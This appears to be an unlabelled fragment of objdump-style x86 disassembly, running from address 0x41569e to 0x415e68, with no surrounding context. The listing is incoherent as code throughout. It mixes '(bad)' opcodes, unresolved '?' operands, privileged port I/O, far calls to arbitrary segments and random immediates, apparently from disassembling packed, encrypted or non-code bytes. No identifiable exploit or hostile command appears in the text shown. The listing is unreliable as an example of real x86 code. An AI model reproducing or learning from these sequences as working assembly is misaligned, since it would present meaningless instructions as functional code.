  41569e:	jno    0x4156dd
  4156a0:	popa   
  4156a1:	push   edi
  4156a2:	in     eax,0x79
  4156a4:	popa   
  4156a5:	pop    eax
  4156a6:	dec    ecx
  4156a7:	dec    esi
  4156a8:	es inc eax
  4156aa:	std    
  4156ab:	mov    esi,0xea462fa7
  4156b0:	mov    WORD PTR [eax+edx*4],fs
  4156b3:	shl    DWORD PTR [edi-0x33912f04],1
  4156b9:	pusha  
  4156ba:	or     dh,BYTE PTR [edx]
  4156bc:	ins    BYTE PTR es:[edi],dx
  4156bd:	adc    edx,0xb763bebe
  4156c3:	mov    al,0x63
  4156c5:	shr    DWORD PTR [edx+ebp*1+0x5f35e92d],cl
  4156cc:	aad    0xb2
  4156ce:	dec    ebx
  4156cf:	push   edi
  4156d0:	xchg   edi,eax
  4156d1:	das    
  4156d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156d3:	mov    ds:0xb11d70f6,eax
  4156d8:	add    cl,BYTE PTR [ebx+0x3f]
  4156db:	inc    ecx
  4156dc:	rcl    DWORD PTR fs:[esi+0x94deffd],cl
  4156e3:	in     eax,0xb5
  4156e5:	push   ds
  4156e6:	fs mov dh,0xe5
  4156e9:	pop    edx
  4156ea:	sbb    esi,DWORD PTR [ebx+0x67420594]
  4156f0:	cmp    eax,DWORD PTR [eax-0x426eae8b]
  4156f6:	cmp    DWORD PTR [ebx+0xd],ecx
  4156f9:	enter  0x54b2,0xee
  4156fd:	stc    
  4156fe:	pop    esi
  4156ff:	push   DWORD PTR [esi+0x66314a30]
  415705:	pop    ss
  415706:	xchg   ebx,eax
  415707:	ins    DWORD PTR es:[edi],dx
  415708:	inc    ebx
  415709:	inc    ebx
  41570a:	sahf   
  41570b:	dec    esp
  41570c:	dec    eax
  41570d:	push   esi
  41570e:	jne    0x415717
  415710:	pushf  
  415711:	cld    
  415712:	outs   dx,DWORD PTR ds:[esi]
  415713:	push   esi
  415714:	or     eax,0x98fe82a4
  415719:	test   DWORD PTR [eax],eax
  41571b:	jne    0x415776
  41571d:	add    eax,0xbc71d223
  415722:	retf   0x6cbf
  415725:	fisttp DWORD PTR [si+0x28f2]
  41572a:	dec    ebx
  41572b:	dec    esi
  41572c:	mov    DWORD PTR [edx],ecx
  41572e:	pop    edx
  41572f:	jbe    0x415710
  415731:	and    eax,0xe72c4516
  415736:	in     eax,dx
  415737:	sub    ebx,DWORD PTR cs:[bx+di+0x695f]
  41573d:	inc    esp
  41573e:	push   cs
  41573f:	cmp    eax,edi
  415741:	(bad)  
  415742:	(bad)  
  415744:	mov    ds:0x9e38bca8,al
  415749:	dec    ecx
  41574a:	mov    WORD PTR [eax+eax*8-0x232c31d6],es
  415751:	aad    0xd8
  415753:	mov    ah,0x46
  415755:	sbb    BYTE PTR [eax-0x55],ah
  415758:	ret    0xf05d
  41575b:	add    BYTE PTR [esp+ebx*2],cl
  41575e:	and    BYTE PTR [ebx-0x10],dl
  415761:	inc    edi
  415762:	mov    ?,eax
  415764:	inc    ecx
  415765:	mov    BYTE PTR [esi+ecx*1-0x2841f187],al
  41576c:	xchg   ebp,eax
  41576d:	inc    ebp
  41576e:	mov    fs,WORD PTR [ecx+0xaf20db2]
  415774:	shr    DWORD PTR [eax+0x6],1
  415777:	dec    ebx
  415778:	stc    
  415779:	xor    esp,DWORD PTR [ecx+esi*1]
  41577c:	in     al,dx
  41577d:	fsubr  st(6),st
  41577f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415780:	inc    edx
  415781:	mov    esi,0xbc93536a
  415786:	ins    BYTE PTR es:[edi],dx
  415787:	inc    esp
  415788:	test   BYTE PTR [edi+0x7ca936f1],al
  41578e:	aaa    
  41578f:	add    BYTE PTR [eax],0x98
  415792:	add    al,0x4
  415794:	jno    0x415727
  415796:	repz dec edi
  415798:	cwde   
  415799:	outs   dx,DWORD PTR ds:[esi]
  41579a:	mov    edx,0xcac8783e
  41579f:	stos   DWORD PTR es:[edi],eax
  4157a0:	es jae 0x415786
  4157a3:	(bad)  
  4157a4:	ror    BYTE PTR [esi],0xf7
  4157a7:	mov    ebx,0xa1b5c993
  4157ac:	lahf   
  4157ad:	mov    ds:0x6117d60e,al
  4157b2:	jmp    0x41577c
  4157b4:	aas    
  4157b5:	and    ebx,ebp
  4157b7:	jmp    0x4157c2
  4157b9:	iret   
  4157ba:	xchg   edi,eax
  4157bb:	addr16 dec ebp
  4157bd:	nop
  4157be:	and    al,BYTE PTR [ecx]
  4157c0:	ficom  WORD PTR [esi]
  4157c2:	inc    ebp
  4157c3:	or     DWORD PTR [esi],esp
  4157c5:	sub    al,0xf8
  4157c7:	ss ret 
  4157c9:	cmp    dl,BYTE PTR [ebx+0x5d]
  4157cc:	add    BYTE PTR [edi-0x11],0xd0
  4157d0:	shl    DWORD PTR [ebx-0x16],cl
  4157d3:	cs jns 0x41579d
  4157d6:	add    BYTE PTR [esi],dl
  4157d8:	pusha  
  4157d9:	daa    
  4157da:	sbb    bl,BYTE PTR [edi+0xc]
  4157dd:	push   esp
  4157de:	push   0x63a955ee
  4157e3:	pop    edi
  4157e4:	push   edx
  4157e5:	aaa    
  4157e6:	mov    WORD PTR [esi+0x665e4e61],?
  4157ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157ed:	mov    ecx,0x92dd7722
  4157f2:	xor    esp,0xa7c0499c
  4157f8:	mov    WORD PTR [ebp+0x7e],es
  4157fb:	push   ecx
  4157fc:	lods   al,BYTE PTR ds:[esi]
  4157fd:	jb     0x41579a
  4157ff:	or     BYTE PTR [edx+0x2b],dl
  415802:	js     0x4157c8
  415804:	mov    al,0xd7
  415806:	test   al,0x6a
  415808:	cmp    DWORD PTR [ecx-0x24ba24da],ecx
  41580e:	xchg   dl,cl
  415810:	jae    0x41585a
  415812:	and    eax,0x455d6eb4
  415817:	xchg   esp,eax
  415818:	pop    esi
  415819:	int    0x4d
  41581b:	jecxz  0x41585b
  41581d:	push   edi
  41581e:	sub    esp,DWORD PTR [esi]
  415820:	ja     0x4157cb
  415822:	sbb    eax,0x36f2ff43
  415827:	cld    
  415828:	jae    0x415850
  41582a:	shr    esp,1
  41582c:	mov    ds:0xa139b7c2,eax
  415831:	fnsave [ebp+ebp*4+0x35]
  415835:	or     eax,0xc64b549b
  41583a:	sbb    DWORD PTR [edx-0x85d163d],esp
  415840:	dec    ebx
  415841:	pop    eax
  415842:	mov    gs,WORD PTR [edx+edx*8]
  415845:	xor    edx,ecx
  415847:	mov    DWORD PTR [esi-0x247d49a5],eax
  41584d:	je     0x415840
  41584f:	rcl    DWORD PTR [ebx+0x2],0xa5
  415853:	sbb    al,0xaf
  415855:	or     DWORD PTR [edi+esi*2-0x56832787],0xb6a23352
  415860:	out    dx,eax
  415861:	sbb    dh,dh
  415863:	xchg   ecx,eax
  415864:	loop   0x41588f
  415866:	cmp    dl,bh
  415868:	rcr    ah,1
  41586a:	aad    0x72
  41586c:	push   ebp
  41586d:	fnstcw WORD PTR [eax]
  41586f:	pop    ss
  415870:	xchg   ebp,eax
  415871:	fcomp  QWORD PTR [eax+edi*2-0x5ae1c9f8]
  415878:	sub    DWORD PTR [eax],ebx
  41587a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41587b:	pop    eax
  41587c:	mov    esp,0xccf36971
  415881:	into   
  415882:	lock adc cl,BYTE PTR [edi]
  415885:	or     dl,cl
  415887:	dec    esp
  415888:	xchg   ecx,eax
  415889:	jne    0x41583c
  41588b:	out    0x7c,eax
  41588d:	push   0x4735c603
  415892:	pop    edi
  415893:	inc    ebx
  415894:	dec    ebx
  415895:	arpl   WORD PTR [ecx-0x15a1c5b],cx
  41589b:	and    DWORD PTR [edi-0x775100c1],ecx
  4158a1:	or     edx,DWORD PTR [esi+0x72]
  4158a4:	sub    DWORD PTR [edi+0x1a],esi
  4158a7:	mov    edi,0x36833773
  4158ac:	(bad)  
  4158ad:	pusha  
  4158ae:	(bad)
  4158b2:	jnp    0x41588d
  4158b4:	jb     0x4158e5
  4158b6:	retf   
  4158b7:	xor    ecx,ebp
  4158b9:	jl     0x415920
  4158bb:	mov    ds,WORD PTR [ecx-0x5215e6d2]
  4158c1:	call   0xa091:0xb8e47ed5
  4158c8:	shl    dl,1
  4158ca:	nop
  4158cb:	imul   eax,DWORD PTR [esi-0xa],0xd6601f3c
  4158d2:	sbb    DWORD PTR [ebx+0x51],0x3d287e05
  4158d9:	aam    0xe3
  4158db:	or     al,0x30
  4158dd:	inc    ebp
  4158de:	cmp    BYTE PTR [ebx-0xb429f5f],cl
  4158e4:	popa   
  4158e5:	sbb    eax,0xe513f174
  4158ea:	xor    BYTE PTR [ecx-0x5e],bh
  4158ed:	sub    dh,bl
  4158ef:	add    BYTE PTR [ebx-0x16],dl
  4158f2:	add    DWORD PTR [esi],ebp
  4158f4:	dec    esi
  4158f5:	stos   BYTE PTR es:[edi],al
  4158f6:	jg     0x4158d5
  4158f8:	lahf   
  4158f9:	push   edi
  4158fa:	lds    esp,FWORD PTR [edx-0x6f]
  4158fd:	add    BYTE PTR [esi],cl
  4158ff:	adc    BYTE PTR [ecx+0xd45a56f],0xa0
  415906:	repnz cmp BYTE PTR [eax+0xe],cl
  41590a:	outs   dx,DWORD PTR ds:[esi]
  41590b:	in     al,dx
  41590c:	outs   dx,BYTE PTR ds:[esi]
  41590d:	push   es
  41590e:	xsha256 (bad)
  41590f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415910:	sar    BYTE PTR [ecx+eiz*1-0x4e5d8ab8],cl
  415917:	or     bh,BYTE PTR [ecx-0x1a2aa912]
  41591d:	fsub   st,st(1)
  41591f:	test   dh,bh
  415921:	(bad)  
  415922:	aam    0x71
  415924:	addr16 jge 0x415964
  415927:	and    eax,0xede317b2
  41592c:	sbb    ah,cl
  41592e:	ror    BYTE PTR [ecx+0x6273d59b],1
  415934:	pop    ecx
  415935:	mov    bh,0x92
  415937:	addr16 aas 
  415939:	xchg   esi,eax
  41593a:	imul   ebx,DWORD PTR [ecx],0xfffffff3
  41593d:	aaa    
  41593e:	sub    ecx,DWORD PTR [esp+edx*4+0x42]
  415942:	xlat   BYTE PTR ds:[ebx]
  415943:	not    ecx
  415945:	aaa    
  415946:	jno    0x415953
  415948:	or     esp,DWORD PTR [esi+0x187bd256]
  41594e:	pop    ds
  41594f:	enter  0x3384,0xca
  415953:	test   ah,dl
  415955:	scas   al,BYTE PTR es:[edi]
  415956:	cld    
  415957:	sub    ecx,ebp
  415959:	jmp    0x87c8:0xf20db18e
  415960:	retf   0x36f7
  415963:	shl    BYTE PTR [eax-0x56d1a559],cl
  415969:	imul   edx,DWORD PTR [ebx-0x42],0xc3788e1a
  415970:	test   BYTE PTR [edi-0x36d9864d],ah
  415976:	arpl   ax,si
  415978:	and    bl,BYTE PTR [ebx-0x2b]
  41597b:	jmp    0x415973
  41597d:	retf   
  41597e:	mov    al,0xad
  415980:	(bad)  
  415981:	mov    esi,0x98440a00
  415986:	push   ebp
  415987:	ins    DWORD PTR es:[edi],dx
  415988:	xchg   esi,eax
  415989:	stc    
  41598a:	and    BYTE PTR [eax-0x7104251c],dl
  415990:	cmp    ecx,0x72707c2a
  415996:	(bad)  
  415997:	jae    0x415a0c
  415999:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41599a:	ds popa 
  41599c:	shl    BYTE PTR [ecx-0x9],0x75
  4159a0:	(bad)  
  4159a1:	dec    eax
  4159a2:	or     dl,BYTE PTR [eax+0x145ea636]
  4159a8:	hlt    
  4159a9:	jno    0x41597b
  4159ab:	inc    ecx
  4159ac:	xchg   esp,eax
  4159ad:	test   al,0x89
  4159af:	loope  0x415a12
  4159b1:	shl    DWORD PTR [ecx+0x3d50fd9e],cl
  4159b7:	jo     0x415988
  4159b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159bb:	pop    esp
  4159bc:	mov    al,ds:0xf9bab9
  4159c1:	xor    DWORD PTR [ebx-0x12],edi
  4159c4:	pusha  
  4159c5:	hlt    
  4159c6:	mov    ah,0x91
  4159c8:	std    
  4159c9:	mov    ?,WORD PTR [eax+0x63]
  4159cc:	dec    ebx
  4159cd:	mov    DWORD PTR [edx+0x49fd402],ebp
  4159d3:	add    al,0xd8
  4159d5:	(bad)  
  4159d6:	sbb    ch,al
  4159d8:	mov    es,WORD PTR [esp+esi*8]
  4159db:	mov    ch,0xd7
  4159dd:	sbb    al,0x9f
  4159df:	cs dec edx
  4159e1:	or     bh,BYTE PTR [ebx+edi*8]
  4159e4:	cmp    dh,BYTE PTR [eax]
  4159e6:	jbe    0x415a37
  4159e8:	dec    edx
  4159e9:	and    eax,0x62e58166
  4159ee:	xor    DWORD PTR [esi],ebx
  4159f0:	push   ecx
  4159f1:	mov    eax,0xf9a4cafe
  4159f6:	xchg   esp,eax
  4159f7:	cmp    ch,BYTE PTR [eax-0x17dd8695]
  4159fd:	out    0xee,eax
  4159ff:	sub    bh,dh
  415a01:	ret    
  415a02:	int    0xaa
  415a04:	jle    0x415a2d
  415a06:	dec    ecx
  415a07:	inc    eax
  415a08:	addr16 push esp
  415a0a:	xor    bh,BYTE PTR [ebp+0x53]
  415a0d:	pop    ebx
  415a0e:	bound  esi,QWORD PTR [ecx]
  415a10:	pop    esp
  415a11:	call   0x31614942
  415a16:	popa   
  415a17:	xchg   DWORD PTR [eax],edx
  415a19:	call   0x414a:0xa1f2f015
  415a20:	jg     0x415a56
  415a22:	scas   al,BYTE PTR es:[edi]
  415a23:	scas   al,BYTE PTR es:[edi]
  415a24:	add    al,0x3a
  415a26:	mov    ah,BYTE PTR [ebx]
  415a28:	out    dx,al
  415a29:	pop    ebp
  415a2a:	mov    eax,ds:0x6b39fd3
  415a2f:	xchg   edx,eax
  415a30:	mov    esp,0x546842e4
  415a35:	dec    esi
  415a36:	iret   
  415a37:	and    dl,BYTE PTR [edi+ecx*4]
  415a3a:	jno    0x415a39
  415a3c:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  415a3e:	push   0xfee26d2d
  415a43:	push   ds
  415a44:	out    dx,eax
  415a45:	adc    eax,0x91a579c2
  415a4a:	mov    esp,0xac3e9d01
  415a4f:	jbe    0x415a49
  415a51:	inc    ebx
  415a52:	pop    eax
  415a53:	cmp    BYTE PTR [ebp-0x25],0x75
  415a57:	xchg   esp,eax
  415a58:	out    0xf9,eax
  415a5a:	pop    ecx
  415a5b:	mov    bh,0xb3
  415a5d:	sub    al,0x52
  415a5f:	jnp    0x4159f2
  415a61:	mov    eax,DWORD PTR [esi+0xb]
  415a64:	pop    ss
  415a65:	mov    ebx,0xad6942b5
  415a6a:	repnz cmp DWORD PTR [ecx],ebp
  415a6d:	gs and eax,0xf63963f6
  415a73:	imul   esi,DWORD PTR [eax+0x562067da],0x4181a782
  415a7d:	addr16 xchg ebp,eax
  415a7f:	xchg   BYTE PTR [ebp+edx*8+0xe394dad],al
  415a86:	dec    ebp
  415a87:	adc    al,0x81
  415a89:	mov    eax,ds:0xd9703a16
  415a8e:	push   0x5a
  415a90:	(bad)  [eax-0x1134a1b7]
  415a96:	mov    esp,0x5fb03b4
  415a9b:	jne    0x415a95
  415a9d:	lds    edx,FWORD PTR [ebx]
  415a9f:	mov    dh,bl
  415aa1:	scas   al,BYTE PTR es:[edi]
  415aa2:	out    0x5b,al
  415aa4:	push   ebp
  415aa5:	rol    DWORD PTR [bx+si+0x5a],0x5a
  415aaa:	aad    0x79
  415aac:	push   0xffffffb3
  415aae:	je     0x415b11
  415ab0:	sti    
  415ab1:	outs   dx,DWORD PTR ds:[esi]
  415ab2:	xchg   ebx,eax
  415ab3:	sti    
  415ab4:	add    ebp,DWORD PTR [eax-0x77]
  415ab7:	icebp  
  415ab8:	rcr    BYTE PTR [ebx-0x4b1fa027],0x12
  415abf:	(bad)  
  415ac0:	repnz mov ebp,DWORD PTR [ebx+0x234bef1d]
  415ac7:	dec    edx
  415ac8:	and    DWORD PTR [ebx-0x208ff2a8],edx
  415ace:	mov    dh,0x2
  415ad0:	mov    esp,0xcdafea3d
  415ad5:	dec    ebx
  415ad6:	inc    edi
  415ad7:	or     al,0xa1
  415ad9:	xchg   ebx,eax
  415ada:	sub    ah,dh
  415adc:	xchg   ebx,eax
  415add:	add    al,0x71
  415adf:	jnp    0x415ab4
  415ae1:	js     0x415a6c
  415ae3:	mov    al,0xa
  415ae5:	and    al,0x13
  415ae7:	inc    ebx
  415ae8:	scas   eax,DWORD PTR es:[edi]
  415ae9:	jne    0x415b21
  415aeb:	mov    ecx,0xfef091d8
  415af0:	sub    ebp,DWORD PTR [eax-0x2df003d8]
  415af6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415af7:	cmp    esp,DWORD PTR [edi+0x30]
  415afa:	mov    al,0x18
  415afc:	inc    edi
  415afd:	add    al,0x48
  415aff:	cmp    dl,bh
  415b01:	mov    DWORD PTR [edx],ebp
  415b03:	adc    al,0xc8
  415b05:	sbb    eax,0x7ac520a8
  415b0a:	(bad)  
  415b0b:	frstor [esp+esi*4]
  415b0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b0f:	mov    bl,0xf0
  415b11:	dec    edx
  415b12:	adc    eax,0x70ff969c
  415b17:	inc    edi
  415b18:	and    DWORD PTR [ebp+ebx*1+0x14],edi
  415b1c:	and    al,0x60
  415b1e:	xchg   esp,eax
  415b1f:	or     al,0xd9
  415b21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b22:	scas   eax,DWORD PTR es:[edi]
  415b23:	dec    ecx
  415b24:	js     0x415b4b
  415b26:	mov    ds:0x1096a606,eax
  415b2b:	mov    eax,0xbbaf4b00
  415b30:	and    DWORD PTR [ebx+0x18bf256b],0xffffffc3
  415b37:	mov    bh,0x90
  415b39:	jp     0x415af3
  415b3b:	jl     0x415b08
  415b3d:	pop    ecx
  415b3e:	stos   BYTE PTR es:[edi],al
  415b3f:	jp     0x415afe
  415b41:	cmp    al,al
  415b43:	mov    ecx,0xb8776319
  415b48:	sub    DWORD PTR [ebx-0xb32cf7d],esi
  415b4e:	mov    eax,ds:0x35fec0bd
  415b53:	loope  0x415b7b
  415b55:	mov    bh,0x64
  415b57:	retf   
  415b58:	sub    al,0xd5
  415b5a:	cmp    edx,DWORD PTR [edi+eiz*8-0x6fbad624]
  415b61:	test   eax,0xb72b0041
  415b66:	push   ebp
  415b67:	sub    al,0xb7
  415b69:	std    
  415b6a:	fstp   DWORD PTR [ebx+0x3fc298a7]
  415b70:	fisubr WORD PTR ds:0xd7a058d0
  415b76:	push   edi
  415b77:	(bad)  
  415b78:	cdq    
  415b79:	retf   
  415b7a:	mov    fs,WORD PTR [ebx-0x5659831c]
  415b80:	aad    0x68
  415b82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b83:	(bad)  
  415b84:	mov    edx,0x8ef120b8
  415b89:	and    DWORD PTR [ecx],esi
  415b8b:	cld    
  415b8c:	aad    0x18
  415b8e:	and    ax,0x8145
  415b92:	xchg   esi,eax
  415b93:	fnsave [eax-0x7daa4a1b]
  415b99:	mov    ch,0x84
  415b9b:	mov    al,0xd6
  415b9d:	xlat   BYTE PTR ds:[ebx]
  415b9e:	push   edi
  415b9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ba0:	pop    esi
  415ba1:	scas   al,BYTE PTR es:[edi]
  415ba2:	loop   0x415b39
  415ba4:	and    al,0x11
  415ba6:	add    BYTE PTR [ecx],ah
  415ba8:	(bad)  
  415ba9:	and    esp,eax
  415bab:	shl    BYTE PTR [ecx+0x3bd24a00],cl
  415bb1:	enter  0xc1e8,0x72
  415bb5:	test   al,0xd2
  415bb7:	sub    al,0xf1
  415bb9:	add    ecx,esi
  415bbb:	ds dec ebp
  415bbd:	sbb    al,0x7d
  415bbf:	adc    esi,edx
  415bc1:	pop    edx
  415bc2:	jecxz  0x415b73
  415bc4:	bound  esp,QWORD PTR ds:0x7f94599e
  415bca:	add    ch,BYTE PTR [edx]
  415bcc:	(bad)  
  415bcd:	push   0x1f2f01c
  415bd2:	mov    DWORD PTR [edi+0x2c],edi
  415bd5:	rcl    ecx,1
  415bd7:	mov    ch,ch
  415bd9:	fst    QWORD PTR [eax]
  415bdb:	mov    es,esi
  415bdd:	jns    0x415bac
  415bdf:	(bad)  
  415be0:	loopne 0x415bb7
  415be2:	aad    0xe6
  415be4:	scas   eax,DWORD PTR es:[edi]
  415be5:	test   eax,esp
  415be7:	push   cs
  415be8:	sub    cl,BYTE PTR [ecx+0x1f]
  415beb:	jae    0x415c1f
  415bed:	mov    edx,0x14bddf0b
  415bf2:	push   eax
  415bf3:	mov    ds:0xffd29d20,eax
  415bf8:	push   ds
  415bf9:	loop   0x415c5f
  415bfb:	push   edx
  415bfc:	mov    ds:0xd5ed5eb8,eax
  415c01:	lea    esi,[ebx+edx*8+0x561d2fdb]
  415c08:	popa   
  415c09:	mov    al,ds:0x90f8d848
  415c0e:	mov    WORD PTR [ebp+0x47],gs
  415c11:	outs   dx,DWORD PTR ds:[esi]
  415c12:	mov    dl,BYTE PTR [ecx-0x7ff87572]
  415c18:	push   ds
  415c19:	test   eax,0x1f3c8ddd
  415c1e:	data16 dec si
  415c21:	and    al,0x93
  415c23:	push   cs
  415c24:	cmp    DWORD PTR [edx],0xffffff88
  415c27:	std    
  415c28:	(bad)  
  415c29:	call   0xa246:0x1d9f52c1
  415c30:	push   0x2006d56f
  415c35:	paddw  mm7,mm5
  415c38:	lea    esp,gs:[edi+0x5]
  415c3c:	sub    edx,DWORD PTR [ebx]
  415c3e:	dec    ebp
  415c3f:	pop    esi
  415c40:	fbld   TBYTE PTR [ebx+ebx*1-0x5e02204f]
  415c47:	push   eax
  415c48:	sub    ecx,ebp
  415c4a:	nop
  415c4b:	and    ebp,DWORD PTR [eax-0x71]
  415c4e:	lds    ebx,FWORD PTR [edi-0x72]
  415c51:	xor    DWORD PTR [ebp-0x73],ebx
  415c54:	add    ebx,esi
  415c56:	aas    
  415c57:	xchg   BYTE PTR [ebp+edx*2-0xc1fec68],ch
  415c5e:	push   0x29d26f00
  415c63:	sbb    BYTE PTR [ebp+0x13653245],dl
  415c69:	or     BYTE PTR [esp+ebx*1-0x54c6795c],0x74
  415c71:	push   edx
  415c72:	jo     0x415c5a
  415c74:	call   0xef8cae53
  415c79:	mov    al,0x56
  415c7b:	ds retf 0xd33f
  415c7f:	cld    
  415c80:	hlt    
  415c81:	pop    ebx
  415c82:	cmp    ebx,eax
  415c84:	pop    es
  415c85:	sbb    DWORD PTR [esi],eax
  415c87:	out    0x38,eax
  415c89:	rol    cl,0xe0
  415c8c:	cli    
  415c8d:	clc    
  415c8e:	pop    ss
  415c8f:	cli    
  415c90:	(bad)  
  415c91:	xchg   esi,eax
  415c92:	jl     0x415c7f
  415c94:	sbb    eax,0x8aea3a03
  415c99:	fisubr WORD PTR [eax-0xc3969bd]
  415c9f:	daa    
  415ca0:	pop    esi
  415ca1:	inc    eax
  415ca2:	into   
  415ca3:	bound  eax,QWORD PTR [edi+ecx*8]
  415ca6:	push   0xffffffa1
  415ca8:	sbb    eax,0xec6f0a82
  415cad:	sbb    esi,DWORD PTR [esi+esi*8+0x49]
  415cb1:	cmp    DWORD PTR [esi],ecx
  415cb3:	sub    ecx,DWORD PTR [esi]
  415cb5:	or     DWORD PTR [edx],0xffffffaa
  415cb8:	jbe    0x415ced
  415cba:	jecxz  0x415c5b
  415cbc:	mov    ds:0x4499d6be,al
  415cc1:	fwait
  415cc2:	rcr    BYTE PTR [ebx-0x73fb1e96],0xd9
  415cc9:	es sbb eax,0xc8858bb1
  415ccf:	push   es
  415cd0:	jne    0x415cc3
  415cd2:	or     al,0x3d
  415cd4:	daa    
  415cd5:	mov    eax,ds:0x12deb242
  415cda:	cmp    cl,BYTE PTR [edx+0x20d92133]
  415ce0:	adc    BYTE PTR [ebx-0x61],cl
  415ce3:	xchg   edx,eax
  415ce4:	int3   
  415ce5:	aas    
  415ce6:	add    ebx,DWORD PTR [ebp+0x42]
  415ce9:	jbe    0x415c90
  415ceb:	gs imul eax,edi,0xb50aee8d
  415cf2:	push   es
  415cf3:	lahf   
  415cf4:	in     eax,dx
  415cf5:	clc    
  415cf6:	mov    edi,0xc5c8ec10
  415cfb:	ja     0x415cd6
  415cfd:	adc    BYTE PTR [esp+ebp*1+0x67],0xba
  415d02:	call   0xc081:0x476fab1b
  415d09:	mov    ds:0x5fddd3d4,al
  415d0e:	push   ss
  415d0f:	push   ebx
  415d10:	shl    BYTE PTR [ebx+ebx*2-0x20da9212],0xd2
  415d18:	pop    ss
  415d19:	xor    al,ch
  415d1b:	and    BYTE PTR [esi+0x31c951ac],0x4a
  415d22:	js     0x415cc8
  415d24:	sub    BYTE PTR [edx],ch
  415d26:	or     BYTE PTR [edx+0x174a556f],cl
  415d2c:	mov    eax,ds:0xfdb510fa
  415d31:	xchg   ebx,eax
  415d32:	xchg   ecx,eax
  415d33:	cmp    al,0x45
  415d35:	mov    bh,0x36
  415d37:	mov    bl,0x65
  415d39:	mov    eax,0x59025723
  415d3e:	add    edi,DWORD PTR [edx+edi*1]
  415d41:	dec    eax
  415d42:	std    
  415d43:	aas    
  415d44:	stos   BYTE PTR es:[edi],al
  415d45:	repz fadd QWORD PTR [ecx+edx*8]
  415d49:	leave  
  415d4a:	add    edx,DWORD PTR [ebx+0x43]
  415d4d:	mov    eax,0x7859fb40
  415d52:	inc    edi
  415d53:	test   al,0x39
  415d55:	cld    
  415d56:	push   0xffffffa1
  415d58:	jl     0x415da5
  415d5a:	push   0x921a4b08
  415d5f:	and    eax,0xa00c56d0
  415d64:	je     0x415cfa
  415d66:	sti    
  415d67:	mov    ebp,0xad9d8381
  415d6c:	imul   edi,DWORD PTR [ebx],0xffffffc4
  415d6f:	clc    
  415d70:	xor    al,0xf8
  415d72:	and    al,0x12
  415d74:	popa   
  415d75:	mov    esp,DWORD PTR [esi+0x61]
  415d78:	das    
  415d79:	sub    DWORD PTR [edi],ecx
  415d7b:	icebp  
  415d7c:	jne    0x415d77
  415d7e:	xor    eax,DWORD PTR [edx+0x50]
  415d81:	dec    ebx
  415d82:	ins    BYTE PTR es:[edi],dx
  415d83:	inc    ecx
  415d84:	cmp    bl,0x68
  415d87:	or     DWORD PTR [ebx-0x3e],ebp
  415d8a:	cdq    
  415d8b:	or     eax,0xa820bf46
  415d90:	mov    esi,0xd938ffd9
  415d95:	jmp    0x415d8c
  415d97:	and    ecx,DWORD PTR [ebp-0x330b29b3]
  415d9d:	mov    ebx,0x3e4cd84a
  415da2:	push   0xba4530bc
  415da7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415da8:	scas   al,BYTE PTR es:[edi]
  415da9:	inc    ebp
  415daa:	call   0xb0fbbfa5
  415daf:	and    al,0x2e
  415db1:	sbb    eax,0x41bc3451
  415db6:	inc    ebx
  415db7:	lahf   
  415db8:	retf   0x76f3
  415dbb:	addr16 jae 0x415d92
  415dbe:	mov    dh,BYTE PTR [ebp+0xe]
  415dc1:	(bad)  
  415dc2:	in     eax,dx
  415dc3:	and    cl,bh
  415dc5:	cwde   
  415dc6:	bnd jno 0x415d96
  415dc9:	loop   0x415da2
  415dcb:	adc    eax,0xf30e5243
  415dd0:	ins    DWORD PTR es:[edi],dx
  415dd1:	imul   edx,DWORD PTR [bp+di-0x2],0x6bb5292a
  415dd9:	or     DWORD PTR [edi+ebp*2+0x778a6aec],eax
  415de0:	xor    BYTE PTR [ecx],dh
  415de2:	or     BYTE PTR [ebx-0x7c290066],0xae
  415de9:	push   cs
  415dea:	(bad)  
  415deb:	mov    esp,0xdf618f6d
  415df0:	cdq    
  415df1:	mov    bh,0xe
  415df3:	inc    edi
  415df4:	dec    eax
  415df5:	cmp    al,0x52
  415df7:	jbe    0x415e02
  415df9:	jb     0x415d85
  415dfb:	std    
  415dfc:	fistp  QWORD PTR [ebp+0x1d]
  415dff:	cmp    BYTE PTR [eax],ch
  415e01:	pop    ebp
  415e02:	inc    edi
  415e03:	inc    ecx
  415e04:	adc    bh,bh
  415e06:	adc    edi,DWORD PTR [esi+ebp*8-0x7b4a2731]
  415e0d:	stc    
  415e0e:	out    dx,al
  415e0f:	mov    BYTE PTR [ecx-0x3aec5bac],cl
  415e15:	pop    edx
  415e16:	push   eax
  415e17:	mov    esi,0xf466c8c6
  415e1c:	xchg   dh,dh
  415e1e:	pop    ds
  415e1f:	out    0x8d,eax
  415e21:	sbb    bl,ah
  415e23:	xor    BYTE PTR [ebx-0x49e8f430],bh
  415e29:	and    DWORD PTR [edi+0x7c],ebp
  415e2c:	or     eax,0x126b80eb
  415e31:	add    cl,BYTE PTR [edi-0x48aac630]
  415e37:	adc    DWORD PTR [esp+eiz*2-0xa10ee2f],esi
  415e3e:	mov    ecx,gs
  415e40:	mov    ah,0xbc
  415e42:	xchg   edi,eax
  415e43:	or     BYTE PTR [eax],al
  415e45:	xor    eax,0xb03c2825
  415e4a:	test   bh,dl
  415e4c:	push   ecx
  415e4d:	arpl   WORD PTR [ebx+0x33f6dda6],bx
  415e53:	xor    eax,0x1eeeef04
  415e58:	xchg   esi,eax
  415e59:	stc    
  415e5a:	and    BYTE PTR [ebx-0x25],bh
  415e5d:	(bad)  
  415e5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e5f:	push   ebx
  415e60:	(bad)  
  415e61:	in     eax,0xc5
  415e63:	dec    eax
  415e64:	ins    BYTE PTR es:[edi],dx
  415e65:	or     edx,DWORD PTR [ecx-0x10]
  415e68:	lock (bad) 
